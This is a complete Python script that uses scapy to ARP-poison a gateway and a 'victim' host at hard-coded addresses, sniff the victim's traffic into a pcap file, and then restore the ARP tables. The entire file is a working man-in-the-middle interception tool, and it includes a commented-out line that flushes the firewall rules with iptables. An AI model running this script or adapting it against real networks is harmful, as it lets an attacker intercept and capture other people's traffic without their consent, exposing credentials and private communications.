from time import sleep

from scapy.all import sr, send, sniff, wrpcap, conf
from scapy.layers.l2 import ARP
from threading import Thread

import logging

conf.verb = 0

sniff_packets_count: int = 25

gateway_ip, victim_ip = '198.10.0.1', '198.10.0.2'

_thread: Thread = None
_run_thread: bool = True

logging.basicConfig(
    format=u'[LINE:%(lineno)d]# %(levelname)-8s [%(asctime)s]  %(message)s', level=logging.NOTSET)


# """Should run only once."""
# import os
# os.system("iptables -F")
# """Should run only once."""

def exit_with_message(message: str):
    logging.error(message)
    exit()


def get_mac_address(ip_address: str, retry: int = 4, timeout: float = 0.5) -> str or None:
    """Given an IP, sends an ARP 'who-has' request in order to find the associated mac address"""

    answered, _ = sr(ARP(
        op="who-has",
        pdst=ip_address,
    ),
        retry=retry,
        timeout=timeout,
    )

    if not answered:
        return None

    _, response = answered[0]

    return response[ARP].hwsrc


def get_macs(gateway_ip: str, victim_ip: str):
    """Uses get_mac_address to find the associated MAC addresses for the gateway and the victim"""

    logging.info("Finding gateway MAC...")
    gateway_mac = get_mac_address(gateway_ip)
    logging.info("Found.")

    if gateway_mac is None:
        exit_with_message("Couldn't find gateway MAC.")

    logging.info("Finding victim MAC...")
    victim_mac = get_mac_address(victim_ip)
    logging.info("Found.")

    if victim_mac is None:
        exit_with_message("Couldn't find victim MAC.")

    return gateway_mac, victim_mac


def poison_arp(gateway_ip: str, victim_ip: str, timeout_seconds: int = 2):
    """
    Sends two arp requests in order to make the router and the victim redirect their traffic through me.
    Implicitly uses hwsrc=my_mac, saying that the source hardware address associated to psrc is mine.
    """

    global _run_thread

    while _run_thread:
        logging.info("Spoofing ARP...")

        send(ARP(
            op="is-at",
            pdst=gateway_ip,
            psrc=victim_ip,
        ))

        send(ARP(
            op="is-at",
            pdst=victim_ip,
            psrc=gateway_ip,
        ))

        sleep(timeout_seconds)


def restore_network(gateway_ip: str, victim_ip: str):
    """Restores the true ARP addresses, by sending two ARP requests and associating the real hardware addresses to the corresponding IPs"""

    gateway_mac, victim_mac = get_macs(gateway_ip, victim_ip)

    logging.info("Restoring network...")

    send(ARP(
        op="is-at",
        pdst=gateway_ip,
        hwsrc=victim_mac,
        psrc=victim_ip
    ))

    send(ARP(
        op="is-at",
        pdst=victim_ip,
        hwsrc=gateway_mac,
        psrc=gateway_ip
    ))

    logging.info("Network restored.")


def sniff_packets(victim_ip: str, packet_count: int):
    """Uses scapy's built-in sniff() function in order to scan the victim's traffic and save it to a .pcap file."""

    logging.info("Sniffing packets...")
    packets = sniff(
        filter=f"ip host {victim_ip}",
        count=packet_count
    )

    wrpcap(f"{victim_ip}_capture.pcap", packets)

    logging.info("Done.")


def create_arp_poisoning_thread(gateway_ip: str, victim_ip: str):
    global _thread

    logging.info("Creating ARP Poisoning thread...")

    _thread = Thread(target=poison_arp, args=(gateway_ip, victim_ip))

    _thread.start()

    logging.info("Thread is running.")


def stop_thread():
    global _thread, _run_thread

    logging.info("Stopping spoofing thread...")

    _run_thread = False
    _thread.join()

    logging.info("Spoofing thread stopped.")


def main():
    try:
        global gateway_ip, victim_ip, sniff_packets_count

        create_arp_poisoning_thread(gateway_ip, victim_ip)

        sniff_packets(victim_ip, sniff_packets_count)

        stop_thread()

        restore_network(gateway_ip, victim_ip)

    except KeyboardInterrupt:
        logging.info("Forcefully closing.")
        restore_network(gateway_ip, victim_ip)


if __name__ == '__main__':
    main()
